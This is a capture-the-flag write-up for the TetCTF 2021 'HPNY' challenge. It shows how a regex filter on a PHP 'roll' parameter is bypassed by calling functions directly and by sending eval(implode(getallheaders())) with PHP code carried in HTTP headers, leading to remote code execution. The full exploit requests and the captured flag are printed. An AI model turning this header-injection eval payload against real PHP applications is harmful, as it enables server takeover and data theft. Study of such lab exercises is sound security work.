# HPNY
### TetCTF 2021

We can pass a `roll` parameter and there's a filter applied to it (`/^[a-z\(\)\_\.]+$/i`). We can only use `a-z`, `()`, `_` and `.`.

We can pass PHP functions and execute them. `roll=system(ls)` works because PHP coverts ls to 'ls' (`PHP Warning - Use of undefined constant ls - assumed 'ls'`). The server executes `system('ls)()` and returns: `fl4g_here_but_can_you_get_it_hohoho.php index.php`. We want the flag php file.

We could try something with `include(fl4g_here_but_can_you_get_it_hohoho.php)` but there's a `4` in the file name.

Maybe we can use the `get_lucky_number` until we hit a 4... Don't know how to go on with this idea.

Tip says that we must use a function that starts with "get". After searching PHP documentaion and trying functions, I thought about using `getallheaders()`. This way, we can use HTTP headers to write our payload and bypass the filter.

Trying this, we see it works:
```
curl -i -H "User-Agent: system('cat fl4g_here_but_can_you_get_it_hohoho.php')" http://139.180.155.171:8003/\?roll\=print_r\(getallheaders\(\)\)

...

<!-- Let's pray for new year lucky things <3 -->

Array
(
    [Host] => 139.180.155.171:8003
    [Accept] => */*
    [User-Agent] => system('cat fl4g_here_but_can_you_get_it_hohoho.php')
)

```
Now, how to read and execute as PHP code the User-Agent or any other header?

Using `implode()` we can create a single string: `139.180.155.171:8003*/*system('cat fl4g_here_but_can_you_get_it_hohoho.php')`
Writing `roll=eval(implode(getallheader())` we should be able to execute PHP code in the header... However, we must remove the other headers that are not PHP code; otherwise, the code breaks. We can try adding a header tha goes before "Host" to start a comment and finish the comment in the "User-Agent".

Using Burp and after some tests, I ended up with this request structure - which commented out all unwanted headers:
```
GET /?roll=print_r(implode(getallheaders())) HTTP/1.1
abc: /*
Host: 139.180.155.171:8003
def: */
User-Agent: system('cat fl4g_here_but_can_you_get_it_hohoho.php')
ghi: /*
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
jkl: */


```
Response: `/*139.180.155.171:8003*/system('cat fl4g_here_but_can_you_get_it_hohoho.php')/*gzip, deflateclose1max-age=0*/`

Now, we will be (at least we expect we'll be) able to execute the User-Agent by changing the print_r() for eval() in "roll". I still had to make some very small changes because we have a "()" after the code we insert. The final payload request looks like this:
```
GET /?roll=(eval(implode(getallheaders()))) HTTP/1.1
abc: /*
Host: 139.180.155.171:8003
def: */
User-Agent: system('cat fl4g_here_but_can_you_get_it_hohoho.php');
ghi: /*
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
jkl: */


```

Response (only the important part):
``` php
<!-- Let's pray for new year lucky things <3 -->

<?php
$flagsssssssss = "TetCTF{lixi_50k_<3_vina_*100*25926415724382#}";
?>
```
YEY! We have the flag :)

**Flag: `TetCTF{lixi_50k_<3_vina_*100*25926415724382#}`**
